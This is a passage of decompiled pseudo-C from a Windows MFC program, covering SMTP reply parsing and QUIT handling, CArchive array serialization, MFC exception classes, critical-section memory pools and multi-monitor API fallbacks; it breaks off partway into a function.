// 42667C: using guessed type void *off_42667C;

//----- (00409210) --------------------------------------------------------
int __thiscall sub_409210(SOCKET *this)
{
  if ( this[1] )
    sub_409290(this);
  sub_41691E(this + 14);
  CStringArray::~CStringArray((CStringArray *)(this + 8));
  CStringArray::~CStringArray((CStringArray *)(this + 3));
  return sub_408530(this);
}

//----- (00409290) --------------------------------------------------------
int __thiscall sub_409290(SOCKET *this)
{
  int v2; // esi
  int v3; // edx
  char buf[12]; // [esp+8h] [ebp-Ch] BYREF

  v2 = 0;
  if ( this[1] )
  {
    strcpy(buf, aQuit);
    sub_408540(this, buf, strlen(buf));
    v2 = sub_409320((int)this, v3, 221);
    if ( !v2 )
      SetLastError(0x16u);
    this[1] = 0;
  }
  sub_408590(this);
  return v2;
}
// 4092E9: variable 'v3' is possibly undefined

//----- (00409320) --------------------------------------------------------
int __fastcall sub_409320(int a1, int a2, int a3)
{
  SOCKET *v3; // edi
  int v4; // ebx
  int v5; // ebp
  int v6; // eax
  int v7; // esi
  const char *v8; // edi
  char *v9; // ebp
  char *v10; // esi
  char *i; // esi
  char *v12; // esi
  const char *v13; // esi
  char *v14; // eax
  char *v15; // ebx
  char *j; // esi
  const char *v17; // ebp
  char k; // al
  char *v19; // eax
  char *v20; // esi
  unsigned __int8 v21; // dl
  char *v22; // eax
  char *v23; // ecx
  unsigned __int8 v24; // dl
  char v25; // al
  const CHAR *v26; // esi
  unsigned __int8 v27; // al
  int v28; // esi
  const char **v29; // eax
  CString *v30; // ebx
  CString *v31; // eax
  SOCKET v32; // edi
  char *Str; // [esp+10h] [ebp-42Ch]
  CString *v35; // [esp+14h] [ebp-428h]
  bool v36; // [esp+1Bh] [ebp-421h]
  unsigned int v37; // [esp+1Ch] [ebp-420h] BYREF
  DWORD TickCount; // [esp+20h] [ebp-41Ch] BYREF
  LPVOID lpMem; // [esp+24h] [ebp-418h]
  size_t v40; // [esp+28h] [ebp-414h]
  int v41; // [esp+2Ch] [ebp-410h] BYREF
  char v42; // [esp+30h] [ebp-40Ch] BYREF
  int v43; // [esp+438h] [ebp-4h]

  v3 = (SOCKET *)a1;
  v4 = 0;
  v37 = a1;
  *(_DWORD *)(a1 + 52) = -1;
  CStringArray::SetSize((CStringArray *)(a1 + 12), 0, -1);
  CStringArray::SetSize((CStringArray *)(v3 + 8), 0, -1);
  v35 = (CString *)(v3 + 14);
  CString::Empty((CString *)(v3 + 14));
  v42 = 0;
  Str = &v42;
  v40 = 1024;
  lpMem = 0;
  TickCount = GetTickCount();
  do
  {
    while ( 1 )
    {
      if ( GetTickCount() - TickCount > v3[2] )
      {
        CString::operator=(v35, asc_426528);
        Str[v4] = 0;
        SetLastError(0x274Cu);
        goto LABEL_27;
      }
      if ( !sub_4085B0(v3, &v41) )
      {
LABEL_24:
        CString::operator=(v35, asc_42651C);
        Str[v4] = 0;
        goto LABEL_27;
      }
      if ( v41 )
        break;
      Sleep(0xFAu);
    }
    v5 = v40 - v4 - 1;
    if ( v5 < 0 )
      v5 = 0;
    v6 = sub_408570(v3, &Str[v4], v5);
    v7 = v6;
    if ( v6 == -1 )
      goto LABEL_24;
    if ( v6 )
    {
      TickCount = GetTickCount();
      v4 += v7;
    }
    Str[v4] = 0;
    if ( v5 == v7 )
    {
      v40 += 4096;
      v8 = Str;
      v9 = (char *)sub_41665F(v40);
      Str = v9;
      strcpy(v9, v8);
      if ( lpMem )
        sub_416688(lpMem);
      v3 = (SOCKET *)v37;
      lpMem = v9;
    }
    v10 = strrchr(Str, 13);
    if ( !v10 )
      v10 = &Str[v4];
    for ( i = v10 - 1; i >= Str; --i )
    {
      if ( *i == 10 )
        break;
    }
    v12 = i + 4;
  }
  while ( v12 >= &Str[v4] || *v12 != 32 );
  *v12 = 0;
  v3[13] = atoi(v12 - 3);
  *v12 = 32;
LABEL_27:
  if ( v3[13] != -1 )
  {
    v13 = Str;
    v37 = (unsigned int)&Str[v4];
    if ( Str < &Str[v4] )
    {
      do
      {
        v14 = strchr(v13, 13);
        if ( !v14 )
          break;
        v15 = v14;
        if ( v14 - v13 > 4 )
        {
          for ( j = (char *)(v13 + 4); v14 > j; --v14 )
          {
            if ( (unsigned __int8)*(v14 - 1) > 0x20u )
              break;
          }
          v17 = j;
          *v14 = 0;
          for ( k = *j; k; k = *++v17 )
          {
            if ( (unsigned __int8)k > 0x20u )
              break;
          }
          v19 = strchr(v17, 32);
          v20 = v19;
          if ( v19 )
          {
            v21 = *(v19 - 1);
            v22 = v19 - 1;
            v23 = v20;
            if ( v21 <= 0x20u )
            {
              do
              {
                v23 = v22;
                v24 = *--v22;
              }
              while ( v24 <= 0x20u );
            }
            *v23 = 0;
            sub_4155B8((CStringArray *)(v3 + 3), v3[5], v17);
            v25 = v20[1];
            v26 = v20 + 1;
            if ( (unsigned __int8)v25 <= 0x20u )
            {
              do
                v27 = *++v26;
              while ( v27 <= 0x20u );
            }
            sub_4155B8((CStringArray *)(v3 + 8), v3[10], v26);
          }
          else if ( *v17 )
          {
            sub_4155B8((CStringArray *)(v3 + 3), v3[5], v17);
            sub_4155B8((CStringArray *)(v3 + 8), v3[10], byte_442820);
          }
        }
        v13 = v15 + 1;
        if ( (unsigned int)(v15 + 1) >= v37 )
          break;
        if ( *v13 == 10 )
          v13 = v15 + 2;
      }
      while ( (unsigned int)v13 < v37 );
    }
  }
  v28 = v3[5] - 1;
  if ( v28 < 0 )
  {
    if ( *Str )
      CString::operator=(v35, Str);
    v30 = v35;
  }
  else
  {
    v29 = (const char **)sub_409750(v3 + 3, (CString *)&v37, v28);
    v30 = v35;
    v43 = 0;
    sub_416A0B((void **)v35, v29);
    v43 = -1;
    sub_41691E(&v37);
    v36 = *(_DWORD *)(*(_DWORD *)sub_409750(v3 + 8, (CString *)&v37, v28) - 8) > 0;
    sub_41691E(&v37);
    if ( v36 )
    {
      sub_416B60((void **)v35, asc_426518);
      v31 = sub_409750(v3 + 8, (CString *)&TickCount, v28);
      v43 = 1;
      CString::operator+=(v31);
      v43 = -1;
      sub_41691E(&TickCount);
    }
  }
  if ( lpMem )
    sub_416688(lpMem);
  v32 = v3[13];
  if ( v32 == -1 )
  {
    if ( !*(_DWORD *)(*(_DWORD *)v30 - 8) )
      CString::operator=(v30, aSmtp);
    return 0;
  }
  else if ( v32 == a3 )
  {
    return 1;
  }
  else
  {
    if ( !*(_DWORD *)(*(_DWORD *)v30 - 8) )
      CString::operator=(v30, aSmtp_0);
    return 0;
  }
}
// 416B87: using guessed type _DWORD __stdcall CString::operator+=(_DWORD);

//----- (00409750) --------------------------------------------------------
CString *__thiscall sub_409750(_DWORD *this, CString *a2, int a3)
{
  sub_416693(a2, (LPCSTR *)(this[1] + 4 * a3));
  return a2;
}

//----- (00409780) --------------------------------------------------------
int __thiscall sub_409780(_DWORD *this, int a2, int a3)
{
  sub_408640(a2, (const char **)(this[1] + 8 * a3));
  return a2;
}

//----- (004097B0) --------------------------------------------------------
void __thiscall sub_4097B0(void *this)
{
  _DWORD *v2; // esi
  int v3; // ecx
  int v4; // edi

  *(_DWORD *)this = &off_41F1FC;
  v2 = (_DWORD *)*((_DWORD *)this + 1);
  if ( v2 )
  {
    v3 = *((_DWORD *)this + 2);
    if ( v3 )
    {
      v4 = v3;
      do
      {
        sub_41691E(v2 + 1);
        sub_41691E(v2);
        v2 += 2;
        --v4;
      }
      while ( v4 );
    }
    sub_416688(*((LPVOID *)this + 1));
  }
}
// 41F1FC: using guessed type int (*off_41F1FC)();

//----- (00409840) --------------------------------------------------------
void __thiscall sub_409840(int this, CArchive *a2)
{
  CArchive *v2; // edi
  signed int Count; // eax
  signed int v5; // ebp
  _DWORD *v6; // esi
  int v7; // ebp
  int v8; // ecx
  _DWORD *v9; // eax
  signed int v10; // esi
  int v11; // eax
  _DWORD *v12; // esi
  int v13; // ecx
  int v14; // eax
  int v15; // edi
  int v16; // eax
  void *v17; // eax
  int v18; // eax
  char *v19; // ebx
  signed int v20; // [esp+10h] [ebp-8h]
  void *v21; // [esp+14h] [ebp-4h]

  v2 = a2;
  if ( (*((_BYTE *)a2 + 20) & 1) != 0 )
  {
    Count = CArchive::ReadCount(a2);
    v5 = Count;
    if ( Count )
    {
      v8 = *(_DWORD *)(this + 4);
      if ( v8 )
      {
        v10 = *(_DWORD *)(this + 12);
        if ( Count > v10 )
        {
          v16 = *(_DWORD *)(this + 16);
          if ( !v16 )
          {
            v16 = *(_DWORD *)(this + 8) / 8;
            if ( v16 >= 4 )
            {
              if ( v16 > 1024 )
                v16 = 1024;
            }
            else
            {
              v16 = 4;
            }
          }
          v20 = v10 + v16;
          if ( v5 >= v10 + v16 )
            v20 = v5;
          v17 = sub_41665F(8 * v20);
          qmemcpy(v17, *(const void **)(this + 4), 8 * *(_DWORD *)(this + 8));
          v21 = v17;
          sub_409DB0((_DWORD *)v17 + 2 * *(_DWORD *)(this + 8), (_DWORD *)(v5 - *(_DWORD *)(this + 8)));
          sub_416688(*(LPVOID *)(this + 4));
          v2 = a2;
          *(_DWORD *)(this + 4) = v21;
          *(_DWORD *)(this + 8) = v5;
          *(_DWORD *)(this + 12) = v20;
        }
        else
        {
          v11 = *(_DWORD *)(this + 8);
          if ( v11 >= v5 )
          {
            if ( v11 > v5 )
            {
              v12 = (_DWORD *)(v8 + 8 * v5);
              v13 = v11 - v5;
              v14 = v11 - v5 - 1;
              if ( v13 )
              {
                v15 = v14 + 1;
                do
                {
                  sub_408A20(v12);
                  v12 += 2;
                  --v15;
                }
                while ( v15 );
                v2 = a2;
              }
            }
            *(_DWORD *)(this + 8) = v5;
          }
          else
          {
            sub_409DB0((_DWORD *)(v8 + 8 * v11), (_DWORD *)(v5 - v11));
            *(_DWORD *)(this + 8) = v5;
          }
        }
      }
      else
      {
        v9 = sub_41665F(8 * Count);
        *(_DWORD *)(this + 4) = v9;
        sub_409DB0(v9, (_DWORD *)v5);
        *(_DWORD *)(this + 12) = v5;
        *(_DWORD *)(this + 8) = v5;
      }
    }
    else
    {
      v6 = *(_DWORD **)(this + 4);
      if ( v6 )
      {
        if ( *(_DWORD *)(this + 8) )
        {
          v7 = *(_DWORD *)(this + 8);
          do
          {
            sub_408A20(v6);
            v6 += 2;
            --v7;
          }
          while ( v7 );
        }
        sub_416688(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 4) = 0;
      }
      *(_DWORD *)(this + 12) = 0;
      *(_DWORD *)(this + 8) = 0;
    }
  }
  else
  {
    CArchive::WriteCount(a2, *(_DWORD *)(this + 8));
  }
  v18 = *(_DWORD *)(this + 8);
  v19 = *(char **)(this + 4);
  if ( (*((_BYTE *)v2 + 20) & 1) != 0 )
    sub_41A191((int)v2, v19, 8 * v18);
  else
    CArchive::Write(v2, v19, 8 * v18);
}

//----- (00409A10) --------------------------------------------------------
void __thiscall sub_409A10(_DWORD *this)
{
  void *v1; // ecx

  *this = &off_41F1F0;
  v1 = (void *)this[1];
  if ( v1 )
    sub_416688(v1);
}
// 41F1F0: using guessed type int (*off_41F1F0)();

//----- (00409A60) --------------------------------------------------------
void __thiscall sub_409A60(int this, CArchive *a2)
{
  CArchive *v2; // esi
  signed int Count; // eax
  signed int v5; // ebp
  int v6; // edx
  void *v7; // eax
  signed int v8; // ecx
  int v9; // eax
  int v10; // eax
  char *v11; // eax
  int v12; // eax
  char *v13; // ebx
  signed int v14; // [esp+10h] [ebp-8h]
  char *v15; // [esp+14h] [ebp-4h]

  v2 = a2;
  if ( (*((_BYTE *)a2 + 20) & 1) != 0 )
  {
    Count = CArchive::ReadCount(a2);
    v5 = Count;
    if ( Count )
    {
      v6 = *(_DWORD *)(this + 4);
      if ( v6 )
      {
        v8 = *(_DWORD *)(this + 12);
        if ( Count > v8 )
        {
          v10 = *(_DWORD *)(this + 16);
          if ( !v10 )
          {
            v10 = *(_DWORD *)(this + 8) / 8;
            if ( v10 >= 4 )
            {
              if ( v10 > 1024 )
                v10 = 1024;
            }
            else
            {
              v10 = 4;
            }
          }
          v14 = v8 + v10;
          if ( v5 >= v8 + v10 )
            v14 = v5;
          v11 = (char *)sub_41665F(4 * v14);
          qmemcpy(v11, *(const void **)(this + 4), 4 * *(_DWORD *)(this + 8));
          v15 = v11;
          memset(&v11[4 * *(_DWORD *)(this + 8)], 0, 4 * (v5 - *(_DWORD *)(this + 8)));
          sub_416688(*(LPVOID *)(this + 4));
          v2 = a2;
          *(_DWORD *)(this + 4) = v15;
          *(_DWORD *)(this + 8) = v5;
          *(_DWORD *)(this + 12) = v14;
        }
        else
        {
          v9 = *(_DWORD *)(this + 8);
          if ( v5 > v9 )
            memset((void *)(v6 + 4 * v9), 0, 4 * (v5 - v9));
          *(_DWORD *)(this + 8) = v5;
        }
      }
      else
      {
        v7 = sub_41665F(4 * Count);
        *(_DWORD *)(this + 4) = v7;
        memset(v7, 0, 4 * ((unsigned int)(4 * v5) >> 2));
        *(_DWORD *)(this + 12) = v5;
        *(_DWORD *)(this + 8) = v5;
      }
    }
    else
    {
      if ( *(_DWORD *)(this + 4) )
      {
        sub_416688(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 4) = 0;
      }
      *(_DWORD *)(this + 12) = 0;
      *(_DWORD *)(this + 8) = 0;
    }
  }
  else
  {
    CArchive::WriteCount(a2, *(_DWORD *)(this + 8));
  }
  v12 = *(_DWORD *)(this + 8);
  v13 = *(char **)(this + 4);
  if ( (*((_BYTE *)v2 + 20) & 1) != 0 )
    sub_41A191((int)v2, v13, 4 * v12);
  else
    CArchive::Write(v2, v13, 4 * v12);
}

//----- (00409BF0) --------------------------------------------------------
LPVOID __thiscall sub_409BF0(LPVOID lpMem, char a2)
{
  sub_4097B0(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00409C10) --------------------------------------------------------
_DWORD *__thiscall sub_409C10(_DWORD *lpMem, char a2)
{
  sub_409A10(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00409C30) --------------------------------------------------------
void __thiscall sub_409C30(int this, int a2, int a3)
{
  _DWORD *v5; // esi
  int v6; // ecx
  int v7; // ebp
  int v8; // ecx
  _DWORD *v9; // eax
  int v10; // esi
  int v11; // eax
  _DWORD *v12; // esi
  int v13; // ecx
  int v14; // eax
  int v15; // edi
  int v16; // eax
  void *v17; // eax
  void *v18; // [esp+14h] [ebp+4h]
  int v19; // [esp+18h] [ebp+8h]

  if ( a3 != -1 )
    *(_DWORD *)(this + 16) = a3;
  if ( a2 )
  {
    v8 = *(_DWORD *)(this + 4);
    if ( v8 )
    {
      v10 = *(_DWORD *)(this + 12);
      if ( a2 > v10 )
      {
        v16 = *(_DWORD *)(this + 16);
        if ( !v16 )
        {
          v16 = *(_DWORD *)(this + 8) / 8;
          if ( v16 >= 4 )
          {
            if ( v16 > 1024 )
              v16 = 1024;
          }
          else
          {
            v16 = 4;
          }
        }
        v19 = v10 + v16;
        if ( a2 >= v10 + v16 )
          v19 = a2;
        v17 = sub_41665F(8 * v19);
        qmemcpy(v17, *(const void **)(this + 4), 8 * *(_DWORD *)(this + 8));
        v18 = v17;
        sub_409DB0((_DWORD *)v17 + 2 * *(_DWORD *)(this + 8), (_DWORD *)(a2 - *(_DWORD *)(this + 8)));
        sub_416688(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 8) = a2;
        *(_DWORD *)(this + 4) = v18;
        *(_DWORD *)(this + 12) = v19;
      }
      else
      {
        v11 = *(_DWORD *)(this + 8);
        if ( v11 >= a2 )
        {
          if ( v11 > a2 )
          {
            v12 = (_DWORD *)(v8 + 8 * a2);
            v13 = v11 - a2;
            v14 = v11 - a2 - 1;
            if ( v13 )
            {
              v15 = v14 + 1;
              do
              {
                sub_408A20(v12);
                v12 += 2;
                --v15;
              }
              while ( v15 );
            }
          }
          *(_DWORD *)(this + 8) = a2;
        }
        else
        {
          sub_409DB0((_DWORD *)(v8 + 8 * v11), (_DWORD *)(a2 - v11));
          *(_DWORD *)(this + 8) = a2;
        }
      }
    }
    else
    {
      v9 = sub_41665F(8 * a2);
      *(_DWORD *)(this + 4) = v9;
      sub_409DB0(v9, (_DWORD *)a2);
      *(_DWORD *)(this + 12) = a2;
      *(_DWORD *)(this + 8) = a2;
    }
  }
  else
  {
    v5 = *(_DWORD **)(this + 4);
    if ( v5 )
    {
      v6 = *(_DWORD *)(this + 8);
      if ( v6 )
      {
        v7 = v6;
        do
        {
          sub_408A20(v5);
          v5 += 2;
          --v7;
        }
        while ( v7 );
      }
      sub_416688(*(LPVOID *)(this + 4));
      *(_DWORD *)(this + 4) = 0;
    }
    *(_DWORD *)(this + 12) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
}

//----- (00409DB0) --------------------------------------------------------
_DWORD *__stdcall sub_409DB0(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // esi
  _DWORD *result; // eax
  _DWORD *v4; // edi

  v2 = a1;
  memset(a1, 0, 4 * ((unsigned int)(8 * (_DWORD)a2) >> 2));
  result = a2;
  if ( a2 )
  {
    v4 = a2;
    do
    {
      if ( v2 )
        result = sub_408620(v2);
      v2 += 2;
      v4 = (_DWORD *)((char *)v4 - 1);
    }
    while ( v4 );
  }
  return result;
}

//----- (00409E01) --------------------------------------------------------
int sub_409E01()
{
  struct CWinThread *Thread; // eax

  Thread = AfxGetThread();
  if ( Thread )
    return (*(int (__thiscall **)(struct CWinThread *))(*(_DWORD *)Thread + 116))(Thread);
  else
    return 0;
}

//----- (00409E22) --------------------------------------------------------
CException *__thiscall sub_409E22(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CResourceException::`vftable';
  return this;
}
// 41F710: using guessed type void *CResourceException::`vftable';

//----- (00409E4C) --------------------------------------------------------
_DWORD *__thiscall sub_409E4C(_DWORD *lpMem, char a2)
{
  sub_409E68(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00409E68) --------------------------------------------------------
void __thiscall sub_409E68(_DWORD *this)
{
  *this = &CResourceException::`vftable';
}
// 41F710: using guessed type void *CResourceException::`vftable';

//----- (00409E6F) --------------------------------------------------------
CException *__thiscall sub_409E6F(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CUserException::`vftable';
  return this;
}
// 41F728: using guessed type void *CUserException::`vftable';

//----- (00409E99) --------------------------------------------------------
_DWORD *__thiscall sub_409E99(_DWORD *lpMem, char a2)
{
  sub_409EB5(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (00409EB5) --------------------------------------------------------
void __thiscall sub_409EB5(_DWORD *this)
{
  *this = &CUserException::`vftable';
}
// 41F728: using guessed type void *CUserException::`vftable';

//----- (00409EBC) --------------------------------------------------------
BOOL __thiscall sub_409EBC(HDC *this, int x, int y)
{
  return PtVisible(this[1], x, y);
}

//----- (00409ED0) --------------------------------------------------------
BOOL __thiscall sub_409ED0(HDC *this, RECT *lprect)
{
  return RectVisible(this[1], lprect);
}

//----- (00409EE0) --------------------------------------------------------
BOOL __thiscall sub_409EE0(HDC *this, int x, int y, LPCSTR lpString, int c)
{
  return TextOutA(this[1], x, y, lpString, c);
}

//----- (00409F59) --------------------------------------------------------
int __thiscall sub_409F59(HDC *this, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format)
{
  return DrawTextA(this[1], lpchText, cchText, lprc, format);
}

//----- (00409FA5) --------------------------------------------------------
int __thiscall sub_409FA5(HDC *this, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut)
{
  return Escape(this[1], iEscape, cjIn, pvIn, pvOut);
}

//----- (0040A0C8) --------------------------------------------------------
BOOL __thiscall sub_40A0C8(HWND *this)
{
  return EnableWindow(this[7], 0);
}

//----- (0040A0E0) --------------------------------------------------------
_DWORD *__thiscall sub_40A0E0(_DWORD *lpMem, char a2)
{
  sub_40A0FC(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A0FC) --------------------------------------------------------
void __thiscall sub_40A0FC(_DWORD *this)
{
  *this = &CArchiveException::`vftable';
  sub_41691E(this + 3);
}
// 41F7D8: using guessed type void *CArchiveException::`vftable';

//----- (0040A128) --------------------------------------------------------
CException *__thiscall sub_40A128(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &off_41F878;
  return this;
}
// 41F878: using guessed type int (*off_41F878)();

//----- (0040A152) --------------------------------------------------------
_DWORD *__thiscall sub_40A152(_DWORD *lpMem, char a2)
{
  sub_40A16E(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A16E) --------------------------------------------------------
void __thiscall sub_40A16E(_DWORD *this)
{
  *this = &off_41F878;
}
// 41F878: using guessed type int (*off_41F878)();

//----- (0040A175) --------------------------------------------------------
CException *__thiscall sub_40A175(CException *this, int a2, int a3)
{
  CException::CException(this, a2);
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 37) = a3;
  *(_DWORD *)this = &CNotSupportedException::`vftable';
  return this;
}
// 41F890: using guessed type void *CNotSupportedException::`vftable';

//----- (0040A19F) --------------------------------------------------------
_DWORD *__thiscall sub_40A19F(_DWORD *lpMem, char a2)
{
  sub_40A1BB(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A1BB) --------------------------------------------------------
void __thiscall sub_40A1BB(_DWORD *this)
{
  *this = &CNotSupportedException::`vftable';
}
// 41F890: using guessed type void *CNotSupportedException::`vftable';

//----- (0040A1C2) --------------------------------------------------------
int __stdcall sub_40A1C2(int a1, int a2)
{
  return 1;
}

//----- (0040A1C8) --------------------------------------------------------
LPVOID __thiscall sub_40A1C8(LPVOID lpMem, char a2)
{
  sub_40A1E4((int)lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A1E4) --------------------------------------------------------
void *__thiscall sub_40A1E4(int this)
{
  *(_DWORD *)this = &CCriticalSection::`vftable';
  DeleteCriticalSection((LPCRITICAL_SECTION)(this + 8));
  return sub_40A61C((_DWORD *)this);
}
// 41F918: using guessed type void *CCriticalSection::`vftable';

//----- (0040A21E) --------------------------------------------------------
BOOL sub_40A21E()
{
  BOOL result; // eax
  HMODULE ModuleHandleA; // eax
  HMODULE v2; // edi

  if ( dword_444570 )
    return GetMonitorInfoA != 0;
  ModuleHandleA = GetModuleHandleA("USER32");
  v2 = ModuleHandleA;
  if ( ModuleHandleA
    && (GetSystemMetrics_0 = (int (__stdcall *)(int))GetProcAddress(ModuleHandleA, "GetSystemMetrics")) != 0
    && (MonitorFromWindow = (HMONITOR (__stdcall *)(HWND, DWORD))GetProcAddress(v2, "MonitorFromWindow")) != 0
    && (MonitorFromRect = (HMONITOR (__stdcall *)(LPCRECT, DWORD))GetProcAddress(v2, "MonitorFromRect")) != 0
    && (MonitorFromPoint = (HMONITOR (__stdcall *)(POINT, DWORD))GetProcAddress(v2, "MonitorFromPoint")) != 0
    && (EnumDisplayMonitors = (BOOL (__stdcall *)(HDC, LPCRECT, MONITORENUMPROC, LPARAM))GetProcAddress(
                                                                                           v2,
                                                                                           "EnumDisplayMonitors")) != 0
    && (GetMonitorInfoA = (BOOL (__stdcall *)(HMONITOR, LPMONITORINFO))GetProcAddress(v2, "GetMonitorInfoA")) != 0 )
  {
    result = 1;
    dword_444570 = 1;
  }
  else
  {
    GetSystemMetrics_0 = 0;
    MonitorFromWindow = 0;
    MonitorFromRect = 0;
    MonitorFromPoint = 0;
    GetMonitorInfoA = 0;
    EnumDisplayMonitors = 0;
    dword_444570 = 1;
    return 0;
  }
  return result;
}
// 444570: using guessed type int dword_444570;

//----- (0040A2F6) --------------------------------------------------------
HMONITOR __stdcall sub_40A2F6(LPCRECT lprc, DWORD dwFlags)
{
  if ( sub_40A21E() )
    return MonitorFromRect(lprc, dwFlags);
  if ( (dwFlags & 3) != 0
    || lprc->right > 0 && lprc->bottom > 0 && lprc->left < GetSystemMetrics(0) && lprc->top < GetSystemMetrics(1) )
  {
    return (HMONITOR)305397826;
  }
  return 0;
}

//----- (0040A3B7) --------------------------------------------------------
BOOL __stdcall sub_40A3B7(HMONITOR hMonitor, LPMONITORINFO lpmi)
{
  int SystemMetrics; // eax
  bool v4; // cf
  _DWORD pvParam[4]; // [esp+8h] [ebp-10h] BYREF

  if ( sub_40A21E() )
    return GetMonitorInfoA(hMonitor, lpmi);
  if ( hMonitor != (HMONITOR)305397826 || !lpmi || lpmi->cbSize < 0x28 || !SystemParametersInfoA(0x30u, 0, pvParam, 0) )
    return 0;
  lpmi->rcMonitor.left = 0;
  lpmi->rcMonitor.top = 0;
  lpmi->rcMonitor.right = GetSystemMetrics(0);
  SystemMetrics = GetSystemMetrics(1);
  lpmi->rcWork.left = pvParam[0];
  lpmi->rcWork.top = pvParam[1];
  lpmi->rcWork.right = pvParam[2];
  v4 = lpmi->cbSize < 0x48;
  lpmi->rcWork.bottom = pvParam[3];
  lpmi->rcMonitor.bottom = SystemMetrics;
  lpmi->dwFlags = 1;
  if ( !v4 )
    lstrcpyA((LPSTR)&lpmi[1], "DISPLAY");
  return 1;
}
// 40A3B7: using guessed type _DWORD pvParam[4];

//----- (0040A46E) --------------------------------------------------------
_DWORD *__thiscall sub_40A46E(_DWORD *lpMem, char a2)
{
  sub_40A48A(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A48A) --------------------------------------------------------
int __thiscall sub_40A48A(_DWORD *this)
{
  *this = &CHandleMap::`vftable';
  sub_4198E6();
  sub_4157FB(this + 8);
  return sub_4157FB(this + 1);
}
// 4198E6: using guessed type int sub_4198E6(void);
// 41FF08: using guessed type void *CHandleMap::`vftable';

//----- (0040A4D2) --------------------------------------------------------
char *__thiscall sub_40A4D2(char *this, int a2, int a3)
{
  *((_DWORD *)this + 3) = 0;
  *((_DWORD *)this + 2) = 0;
  *(_DWORD *)this = a2;
  *((_DWORD *)this + 1) = a3;
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 16));
  return this;
}

//----- (0040A50E) --------------------------------------------------------
void __thiscall sub_40A50E(int this)
{
  struct _RTL_CRITICAL_SECTION *v2; // edi

  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 16);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
  CPlex::FreeDataChain(*(CPlex **)(this + 8));
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  LeaveCriticalSection(v2);
}

//----- (0040A536) --------------------------------------------------------
_DWORD *__thiscall sub_40A536(char *this)
{
  struct _RTL_CRITICAL_SECTION *v2; // ebx
  _DWORD *v3; // eax
  int v4; // ecx
  _DWORD *v5; // edi
  unsigned int v7; // [esp-4h] [ebp-28h]
  _DWORD v8[9]; // [esp+0h] [ebp-24h] BYREF

  v8[5] = v8;
  v8[4] = this;
  v2 = (struct _RTL_CRITICAL_SECTION *)(this + 16);
  EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
  if ( !*((_DWORD *)this + 3) )
  {
    v7 = *(_DWORD *)this;
    v8[8] = 0;
    v3 = (_DWORD *)((char *)CPlex::Create((struct CPlex **)this + 2, *((_DWORD *)this + 1), v7)
                  + *(_DWORD *)this * (*((_DWORD *)this + 1) - 1)
                  + 4);
    if ( *((_DWORD *)this + 1) - 1 >= 0 )
    {
      v4 = *((_DWORD *)this + 1);
      do
      {
        *v3 = *((_DWORD *)this + 3);
        *((_DWORD *)this + 3) = v3;
        v3 = (_DWORD *)((char *)v3 - *(_DWORD *)this);
        --v4;
      }
      while ( v4 );
    }
  }
  v5 = (_DWORD *)*((_DWORD *)this + 3);
  *((_DWORD *)this + 3) = *v5;
  LeaveCriticalSection(v2);
  return v5;
}

//----- (0040A5C5) --------------------------------------------------------
void __thiscall sub_40A5C5(int this, _DWORD *a2)
{
  if ( a2 )
  {
    EnterCriticalSection((LPCRITICAL_SECTION)(this + 16));
    *a2 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 12) = a2;
    LeaveCriticalSection((LPCRITICAL_SECTION)(this + 16));
  }
}

//----- (0040A600) --------------------------------------------------------
_DWORD *__thiscall sub_40A600(_DWORD *lpMem, char a2)
{
  sub_40A61C(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A61C) --------------------------------------------------------
void *__thiscall sub_40A61C(_DWORD *this)
{
  void *result; // eax

  result = (void *)this[1];
  *this = &CSyncObject::`vftable';
  if ( result )
  {
    result = (void *)CloseHandle(result);
    this[1] = 0;
  }
  return result;
}
// 41FFE4: using guessed type void *CSyncObject::`vftable';

//----- (0040A64E) --------------------------------------------------------
unsigned int *__thiscall sub_40A64E(unsigned int *lpMem, char a2)
{
  sub_40A66A(lpMem);
  if ( (a2 & 1) != 0 )
    sub_416688(lpMem);
  return lpMem;
}

//----- (0040A66A) --------------------------------------------------------
BOOL __thiscall sub_40A66A(unsigned int *this)
{
  *this = (unsigned int)&off_42004C;
  return sub_419A1A(this);
}
// 42004C: using guessed type int (*off_42004C)();

//----- (0040AD16) --------------------------------------------------------
void __cdecl sub_40AD16(LPVOID lpMem)
{
  _DWORD *block; // eax
  bool v2; // zf
  _BYTE *v3; // eax
